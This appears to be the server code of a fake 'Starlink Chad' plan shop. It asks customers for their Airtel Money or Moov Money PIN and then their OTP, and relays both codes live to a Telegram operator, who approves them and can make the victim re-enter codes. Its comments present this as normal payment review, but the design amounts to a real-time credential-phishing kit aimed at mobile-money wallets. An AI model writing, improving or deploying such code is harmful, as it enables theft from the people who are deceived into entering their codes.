/**
 * Starlink Chad — Node/Express server.
 *
 * Downgraded from Python/Django to the same plain-Node stack as the working
 * starlink-reseller project: Express + in-memory state, no database.
 *
 * Flow (operator-driven, nothing is invented):
 *   1. customer picks a plan, payment method and phone number
 *   2. enters a PIN -> forwarded as-is to Telegram for review
 *   3. the page waits until the operator taps Allow / Invalid
 *   4. on Allow, the customer enters an OTP -> forwarded to Telegram again
 *   5. on approval the order is marked paid and the success page is shown
 *
 * Orders live in a Map keyed by reference. That is enough for the waiting
 * handshake between the browser and Telegram; a restart clears them, exactly
 * like the reference project.
 */
"use strict";

const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const express = require("express");
const { makeTelegram, CB_ALLOW, CB_INVALID, CB_OTP_CORRECT, CB_OTP_WRONG, CB_OTP_WRONG_PIN } = require("./telegram");

require("dotenv").config();
// The Django project kept its secrets in a root .env; support that too.
require("dotenv").config({ path: path.join(__dirname, "..", ".env") });

const PORT = Number(process.env.PORT || 8000);
const MAX_ATTEMPTS = 2;
const ORDER_TTL_MS = 30 * 60 * 1000;

const rootDir = __dirname;
const data = JSON.parse(fs.readFileSync(path.join(__dirname, "data", "plans.json"), "utf8"));
const PLANS = data.plans;
const NETWORK = data.network_status;

// Invalid references must never grow the map without bound.
const ORDERS = new Map();

const METHODS = {
  airtel: { label: "Airtel Money", otpLength: 4 },
  moov: { label: "Moov Money", otpLength: 6 },
};

// --- Chad mobile-number rules (single source of truth, served to the UI) ---
const CHAD_MOBILE = {
  countryCode: "+235",
  length: 8,
  prefixes: ["6", "7", "9"],
  messages: {
    required: "Veuillez saisir votre numéro de téléphone.",
    digits: "Le numéro de téléphone doit contenir des chiffres.",
    length: "Le numéro doit contenir exactement 8 chiffres (ex : 66 12 34 56).",
    prefix: "Le numéro doit commencer par 6, 7 ou 9 (opérateurs tchadiens).",
    repeated: "Veuillez saisir un numéro de téléphone valide.",
  },
};

const localDigits = (raw) => {
  let digits = String(raw || "").replace(/\D/g, "");
  if (digits.startsWith("235")) digits = digits.slice(3);
  return digits;
};

const CHAD_COUNTRY_CODE = "+235";

function validatePhone(raw) {
  const m = CHAD_MOBILE.messages;
  if (!raw || !String(raw).trim()) return m.required;
  if (!String(raw).replace(/\D/g, "")) return m.digits;
  const digits = localDigits(raw);
  if (digits.length !== CHAD_MOBILE.length) return m.length;
  if (!CHAD_MOBILE.prefixes.some((p) => digits.startsWith(p))) return m.prefix;
  if (new Set(digits).size === 1) return m.repeated;
  return "";
}

function normalisePhone(raw) {
  const digits = localDigits(raw);
  if (!digits) return "";
  const grouped = digits.match(/.{1,2}/g).join(" ");
  return `${CHAD_COUNTRY_CODE} ${grouped}`;
}

// --- order helpers -------------------------------------------------------
function newReference() {
  // Timestamp + random suffix: two orders in the same second stay unique.
  const stamp = new Date().toISOString().replace(/\D/g, "").slice(2, 14);
  const suffix = crypto.randomBytes(2).toString("hex").toUpperCase();
  return `SLD${stamp}${suffix}`;
}

function createOrder({ plan, method, phone }) {
  const reference = newReference();
  const order = {
    reference,
    planId: plan.id,
    planName: plan.name,
    amount: plan.price_xaf,
    method,
    methodLabel: METHODS[method].label,
    otpLength: METHODS[method].otpLength,
    phone,
    pin: "",
    otp: "",
    attempt: 1,
    status: "processing",
    stage: "awaiting_pin", // awaiting_pin | awaiting_otp | done
    updatedAt: Date.now(),
  };
  ORDERS.set(reference, order);
  return order;
}

function sweepOrders() {
  const cutoff = Date.now() - ORDER_TTL_MS;
  for (const [ref, order] of ORDERS) {
    if (order.updatedAt < cutoff) ORDERS.delete(ref);
  }
}
setInterval(sweepOrders, 5 * 60 * 1000).unref();

const publicOrder = (o) => ({
  reference: o.reference,
  planName: o.planName,
  amount: o.amount,
  methodLabel: o.methodLabel,
  phone: o.phone,
  attempt: o.attempt,
  maxAttempts: MAX_ATTEMPTS,
  status: o.status,
  stage: o.stage,
  // Whether a code has been submitted and is waiting on the operator.
  pending:
    (o.stage === "awaiting_pin" && Boolean(o.pin)) ||
    (o.stage === "awaiting_otp" && Boolean(o.otp)),
});

// --- Telegram wiring -----------------------------------------------------
// One handler, used by the Telegram buttons and by the dev-only test route.
async function operatorAction(reference, action) {
  const order = ORDERS.get(reference);
  if (!order) return "⚠️ Commande introuvable ou expirée.";

  if (action === CB_ALLOW) {
    if (order.stage !== "awaiting_pin") return "Cette commande n'attend plus de PIN.";
    order.stage = "awaiting_otp";
    order.updatedAt = Date.now();
    return "✅ PIN confirmé — saisie de l'OTP.";
  }

  if (action === CB_INVALID) {
    if (order.stage !== "awaiting_pin") return "Cette commande n'attend plus de PIN.";
    if (order.attempt < MAX_ATTEMPTS) {
      order.attempt += 1;
      order.pin = "";
      order.updatedAt = Date.now();
      return "❌ PIN incorrect — le client peut réessayer.";
    }
    order.stage = "done";
    order.status = "failed";
    order.updatedAt = Date.now();
    return "❌ PIN incorrect — le client doit recommencer.";
  }

  if (action === CB_OTP_CORRECT) {
    if (order.stage !== "awaiting_otp") return "Cette commande n'attend plus d'OTP.";
    order.stage = "done";
    order.status = "paid";
    order.updatedAt = Date.now();
    return "✅ OTP confirmé — paiement approuvé.";
  }

  if (action === CB_OTP_WRONG) {
    if (order.stage !== "awaiting_otp") return "Cette commande n'attend plus d'OTP.";
    if (order.attempt < MAX_ATTEMPTS) {
      order.attempt += 1;
      order.otp = "";
      order.updatedAt = Date.now();
      return "❌ OTP incorrect — le client peut réessayer.";
    }
    order.stage = "done";
    order.status = "failed";
    order.updatedAt = Date.now();
    return "❌ OTP incorrect — le client doit recommencer.";
  }

  if (action === CB_OTP_WRONG_PIN) {
    // The OTP itself was fine but the PIN the customer entered is wrong:
    // send them back to the PIN entry page. The current attempt is consumed
    // (2nd attempts are always sent back for a fresh code), so at the last
    // attempt the order fails and the customer must start over.
    if (order.stage !== "awaiting_otp") return "Cette commande n'attend plus d'OTP.";
    if (order.attempt < MAX_ATTEMPTS) {
      order.attempt += 1;
      order.otp = "";
      order.pin = "";
      order.stage = "awaiting_pin";
      order.updatedAt = Date.now();
      return "🔑 PIN incorrect — retour à la saisie du PIN.";
    }
    order.stage = "done";
    order.status = "failed";
    order.updatedAt = Date.now();
    return "🔑 PIN incorrect — le client doit recommencer.";
  }

  return "Action inconnue.";
}

const telegram = makeTelegram({
  token: process.env.TELEGRAM_BOT_TOKEN,
  chatId: process.env.TELEGRAM_CHAT_ID,
  log: console,
  onAction: operatorAction,
});

// --- app -----------------------------------------------------------------
const app = express();
app.use(express.json({ limit: "32kb" }));
app.use(express.urlencoded({ extended: false }));
// Views are plain HTML with a deliberately tiny template layer: {{value}},
// {{#each list}}...{{/each}} and {{> partial}}. No dependency, no build step.
const viewsDir = path.join(rootDir, "views");

function renderString(src, data) {
  // {{#each key}} ... {{/each}}
  src = src.replace(/\{\{#each\s+([\w.]+)\s*\}\}([\s\S]*?)\{\{\/each\}\}/g, (_, key, body) => {
    const list = key.split(".").reduce((a, k) => (a == null ? a : a[k]), data) || [];
    return list.map((item) => renderString(body, item)).join("");
  });
  // {{#if key}} ... {{/if}}
  src = src.replace(/\{\{#if\s+([\w.]+)\s*\}\}([\s\S]*?)\{\{\/if\}\}/g, (_, key, body) => {
    const v = key.split(".").reduce((a, k) => (a == null ? a : a[k]), data);
    return v ? renderString(body, data) : "";
  });
  // {{> partial}}
  src = src.replace(/\{\{>\s*([\w.-]+)\s*\}\}/g, (_, name) =>
    renderString(fs.readFileSync(path.join(viewsDir, name), "utf8"), data)
  );
  // {{value}}
  return src.replace(/\{\{\s*([\w.]+)\s*\}\}/g, (_, key) => {
    const v = key.split(".").reduce((a, k) => (a == null ? a : a[k]), data);
    return v == null ? "" : String(v);
  });
}

app.set("view engine", "html");
app.engine("html", (file, options, cb) => {
  try {
    const src = fs.readFileSync(file, "utf8");
    const template = fs.readFileSync(path.join(viewsDir, "layout.html"), "utf8");
    // Each view carries its <section> block plus a scripts block; the layout
    // supplies the shared chrome around it.
    const scriptPart = (src.match(/<script[^>]*>[\s\S]*?<\/script>/g) || []).join("\n");
    const content = renderString(src.replace(/<script[^>]*>[\s\S]*?<\/script>/g, ""), options);
    cb(null, renderString(template, { ...options, content, scripts: scriptPart }));
  } catch (err) {
    cb(err);
  }
});
app.set("views", viewsDir);

const PAGE = (name) => path.join(rootDir, "public", name);
app.use("/static", express.static(path.join(rootDir, "public", "static")));

app.get("/", (_req, res) => res.render("plans.html", { plans: PLANS, active: "plans" }));
app.get("/plans", (_req, res) => res.render("plans.html", { plans: PLANS, active: "plans" }));
app.get("/plans/", (_req, res) => res.render("plans.html", { plans: PLANS, active: "plans" }));
app.get("/statut", (_req, res) => res.render("status.html", { status: NETWORK, active: "status" }));
app.get("/statut/", (_req, res) => res.render("status.html", { status: NETWORK, active: "status" }));
app.get("/settings", (_req, res) => res.render("settings.html", { active: "settings" }));
app.get("/settings/", (_req, res) => res.render("settings.html", { active: "settings" }));

// Private order pages: the browser must present the per-order token it was
// given at checkout, so a guessed reference cannot drive someone else's order.
function orderPage(req, res, view, options) {
  const order = ORDERS.get(req.params.reference);
  if (!order) return res.status(404).sendFile(PAGE("404.html"));
  if (order.token !== req.params.token) return res.redirect("/plans/");
  const count = (n) => Array.from({ length: n }, (_, i) => i);
  res.render(view, {
    ...options,
    active: "plans",
    order,
    pinLength: 4,
    otpLength: order.otpLength,
    pinBoxes: count(4),
    otpBoxes: count(order.otpLength),
    pinBoxesJson: JSON.stringify(count(4)),
    otpBoxesJson: JSON.stringify(count(order.otpLength)),
    orderJson: JSON.stringify(publicOrder(order)),
    orderToken: order.token,
  });
}

app.get("/orders/:reference/:token/pin", (req, res) =>
  orderPage(req, res, "pin.html", { pinLength: 4 })
);
app.get("/orders/:reference/:token/otp", (req, res) =>
  orderPage(req, res, "otp.html", { otpLength: 0 })
);
app.get("/orders/:reference/:token/success", (req, res) => orderPage(req, res, "success.html", {}));

// --- JSON API ------------------------------------------------------------
app.get("/api/plans", (_req, res) => res.json({ plans: PLANS }));
app.get("/api/status", (_req, res) => res.json({ status: NETWORK }));
app.get("/api/mobile-rules", (_req, res) => res.json(CHAD_MOBILE));

app.post("/api/orders", (req, res) => {
  const { planId, method, phone } = req.body || {};
  const plan = PLANS.find((p) => p.id === planId);
  if (!plan) return res.status(400).json({ ok: false, error: "Veuillez sélectionner un forfait." });
  if (!METHODS[method]) {
    return res.status(400).json({ ok: false, error: "Veuillez sélectionner un mode de paiement." });
  }
  const phoneError = validatePhone(phone);
  if (phoneError) return res.status(400).json({ ok: false, error: phoneError });

  const order = createOrder({ plan, method, phone: normalisePhone(phone) });
  order.token = crypto.randomBytes(12).toString("hex");
  // Nothing is generated: the PIN arrives with the customer's first submit.
  res.json({
    ok: true,
    reference: order.reference,
    next: `/orders/${order.reference}/${order.token}/pin`,
  });
});

function ownedOrder(req) {
  const order = ORDERS.get(req.params.reference);
  if (!order) return { error: [404, "Commande introuvable."] };
  const token = req.get("X-Order-Token") || (req.body && req.body.token);
  if (!token || token !== order.token) return { error: [403, "Accès refusé."] };
  return { order };
}

app.get("/api/orders/:reference", (req, res) => {
  const { order, error } = ownedOrder(req);
  if (error) return res.status(error[0]).json({ ok: false, error: error[1] });
  res.json({ ok: true, order: publicOrder(order) });
});

app.post("/api/orders/:reference/pin", async (req, res) => {
  const { order, error } = ownedOrder(req);
  if (error) return res.status(error[0]).json({ ok: false, error: error[1] });

  const pin = String(req.body?.pin || "").trim();
  if (!/^\d{4}$/.test(pin)) {
    return res.status(400).json({ ok: false, error: "Veuillez saisir les 4 chiffres de votre code PIN." });
  }
  if (order.stage !== "awaiting_pin") {
    return res.status(409).json({ ok: false, error: "Cette commande attend déjà une réponse." });
  }

  order.pin = pin; // stored exactly as entered, nothing generated
  order.updatedAt = Date.now();
  const sent = await telegram.notifyPin(order);
  if (!telegram.enabled || (sent && sent.ok === false)) {
    order.pin = "";
    return res.status(503).json({
      ok: false,
      error: "L'opérateur n'a pas pu être notifié. Veuillez réessayer dans un instant.",
    });
  }
  res.json({ ok: true, stage: order.stage });
});

app.post("/api/orders/:reference/otp", async (req, res) => {
  const { order, error } = ownedOrder(req);
  if (error) return res.status(error[0]).json({ ok: false, error: error[1] });
  const otp = String(req.body?.otp || "").trim();
  const re = new RegExp(`^\\d{${order.otpLength}}$`);
  if (!re.test(otp)) {
    return res.status(400).json({
      ok: false,
      error: `Veuillez saisir les ${order.otpLength} chiffres du code OTP.`,
    });
  }
  if (order.stage !== "awaiting_otp") {
    return res.status(409).json({ ok: false, error: "Cette commande n'attend pas d'OTP." });
  }

  order.otp = otp;
  order.updatedAt = Date.now();
  const sent = await telegram.notifyOtp(order);
  if (!telegram.enabled || (sent && sent.ok === false)) {
    order.otp = "";
    return res.status(503).json({
      ok: false,
      error: "L'opérateur n'a pas pu être notifié. Veuillez réessayer dans un instant.",
    });
  }
  res.json({ ok: true, stage: order.stage });
});

// Development-only: lets tests and local QA act as the operator without
// Telegram. Disabled unless NODE_ENV is not production.
if (process.env.NODE_ENV !== "production") {
  app.post("/api/_test/operator/:reference/:action", async (req, res) => {
    const { action, reference } = req.params;
    const ack = await operatorAction(reference, action);
    res.json({ ok: true, ack });
  });
}

app.use((_req, res) => res.status(404).sendFile(PAGE("404.html")));

if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`Starlink Chad running on http://127.0.0.1:${PORT}`);
    telegram.start();
  });
}

module.exports = { app, validatePhone, normalisePhone, createOrder, ORDERS };
